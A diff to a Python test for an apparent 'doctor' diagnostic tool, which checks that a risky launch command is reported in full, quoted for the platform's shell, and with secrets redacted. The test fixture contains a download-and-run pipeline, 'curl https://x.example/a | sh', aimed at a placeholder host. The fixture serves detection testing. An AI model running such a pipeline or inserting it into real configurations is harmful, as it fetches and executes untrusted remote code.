@@ -64,7 +64,12 @@ class LaunchChecks(DoctorTest):
         self.assertIn("the launch command runs code written on the command line (cmd /c)", out)
         self.assertIn("downloads something and runs it", out)
         (line,) = [line for line in out.splitlines() if "The full command:" in line]
-        self.assertTrue(line.endswith(f"{long_argument} && curl https://x.example/a | sh"), line[-200:])  # never cut
+        # The full command is quoted for the shell of the system doctor runs on. "&&" and "|" are words of
+        # the launch command here, not a shell's own operators, so a POSIX shell quotes them and cmd does
+        # not; either way the line is never cut short.
+        tail = (f"{long_argument} && curl https://x.example/a | sh" if sys.platform == "win32"
+                else f"{long_argument} '&&' curl https://x.example/a '|' sh")
+        self.assertTrue(line.endswith(tail), line[-200:])  # never cut
         self.assertNotIn("more characters", line)
         self.assertNotIn(TOKEN, out)  # but a recognisable secret is redacted
 
